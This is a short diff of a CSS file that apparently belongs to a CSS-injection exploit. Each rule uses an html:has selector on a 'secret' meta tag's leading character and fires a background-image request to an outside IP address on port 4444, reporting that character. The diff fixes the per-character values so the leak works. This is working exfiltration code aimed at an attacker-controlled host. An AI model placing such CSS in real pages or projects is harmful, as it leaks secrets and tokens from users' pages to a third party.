@@ -13,13 +13,13 @@ html:has(meta[name=secret][content^=a]) {
 }
 
 html:has(meta[name=secret][content^=b]) {
-    background-image: url(http://167.99.47.105:4444?char=a);
+    background-image: url(http://167.99.47.105:4444?char=b);
 }
 
 html:has(meta[name=secret][content^=c]) {
-    background-image: url(http://167.99.47.105:4444?char=a);
+    background-image: url(http://167.99.47.105:4444?char=c);
 }
 
 html:has(meta[name=secret][content^=d]) {
-    background-image: url(http://167.99.47.105:4444?char=a);
+    background-image: url(http://167.99.47.105:4444?char=d);
 }
